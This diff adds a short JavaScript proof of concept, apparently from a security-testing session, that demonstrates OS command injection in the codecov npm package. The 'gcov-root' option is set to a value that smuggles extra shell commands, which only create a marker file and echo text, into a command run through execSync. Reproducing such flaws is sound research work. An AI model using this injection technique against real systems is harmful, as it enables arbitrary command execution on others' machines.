@@ -1,0 +1,23 @@
+Good, node_modules isn't tracked so no cleanup concerns, and the file was already restored from backup earlier.
+
+```javascript
+const codecov = require("codecov/lib/codecov.js");
+
+// codecov's upload() builds a shell command by concatenating the
+// 'gcov-root' option directly into a `find ... -exec gcov ...` string
+// and passing it to child_process.execSync() with no sanitization,
+// allowing arbitrary OS command injection.
+codecov.upload(
+  {
+    options: {
+      "gcov-root": "/tmp; touch /tmp/PWNED_TEST; echo INJECTED #",
+      "gcov-exec": "gcov",
+      "gcov-args": "",
+      disable: "detect",
+      dump: true
+    }
+  },
+  () => {},
+  () => {}
+);
+```
